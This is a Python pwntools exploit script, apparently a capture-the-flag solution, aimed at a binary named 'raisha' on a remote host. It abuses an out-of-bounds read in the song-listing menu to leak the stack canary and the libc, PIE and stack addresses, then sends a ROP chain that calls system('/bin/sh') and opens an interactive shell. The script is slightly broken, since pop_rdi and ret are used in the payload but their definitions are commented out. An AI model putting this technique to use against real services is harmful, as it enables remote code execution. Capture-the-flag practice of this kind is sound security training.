#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './raisha_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '27.112.79.222', 7010

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x12fc
breakrva 0x1546

# kuki
breakrva 0x1530
breakrva 0x14a3
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec raisha
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def fuzz():
    context.log_level = 'warning'

    for i in range(1, 40):
        io = initialize()
        
        io.sendlineafter(b'list song', b'2')
        io.sendlineafter(b'number: ', f'{i}'.encode())
        leak = io.recvline().decode()
        log.warn('[%d]: %s', i, leak)

        io.close()

stack = 0x0
def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'list song', b'2')
    io.sendlineafter(b'number: ', b'11')
    canary = int(io.recvline(), 16)

    io.sendlineafter(b'list song', b'2')
    io.sendlineafter(b'number: ', b'15')
    libc.address = int(io.recvline(), 16) - 0x28150
    system = libc.address + 0x552b0

    # rop = ROP(libc)
    # pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    # ret = rop.find_gadget(['ret'])[0]

    io.sendlineafter(b'list song', b'2')
    io.sendlineafter(b'number: ', b'17')
    elf.address = int(io.recvline(), 16) - 0x137e

    io.sendlineafter(b'list song', b'2')
    io.sendlineafter(b'number: ', b'19')
    stack = int(io.recvline(), 16)

    payload = b'1111'.ljust(10, b'\x00')
    payload += flat([
        # preserving try catch stack frame
        canary, # local->1 remote->11
        0x0,
        0x0,
        stack-0x118,
        elf.address+0x1421,

        # overwrite main's return address
        p64(0x0) * 3,
        canary,
        p64(0x0) * 9,
        canary,
        p64(0x0) * 3,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        ret,
        system,
    ])
    io.sendlineafter(b'list song', b'1')
    io.sendlineafter(b'number: ', b'1')
    io.sendline(payload)

    # sleep(1)
    # io.sendline(b'cat flag*')

    log.success('canary: %#x', canary)
    log.success('libc base: %#x', libc.address)
    log.success('elf base: %#x', elf.address)
    log.success('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()
